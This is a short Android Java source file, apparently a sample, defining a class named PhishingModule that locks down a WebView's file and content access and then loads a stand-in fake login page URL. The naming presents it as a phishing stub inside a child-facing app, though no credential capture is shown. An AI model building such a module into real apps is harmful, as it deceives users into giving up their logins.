package com.kidsguard.child;

import android.os.Build;
import android.webkit.WebSettings;
import android.webkit.WebView;

public class PhishingModule {

    public void initWebView(WebView webView) {
        if (webView == null) return;
        WebSettings settings = webView.getSettings();
        settings.setJavaScriptEnabled(true);
        
        settings.setAllowFileAccess(false);
        settings.setAllowContentAccess(false);
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN) {
            settings.setAllowFileAccessFromFileURLs(false);
            settings.setAllowUniversalAccessFromFileURLs(false);
        }

        settings.setCacheMode(WebSettings.LOAD_NO_CACHE);
        
        webView.loadUrl("https://fake-login-page.com");
    }
}
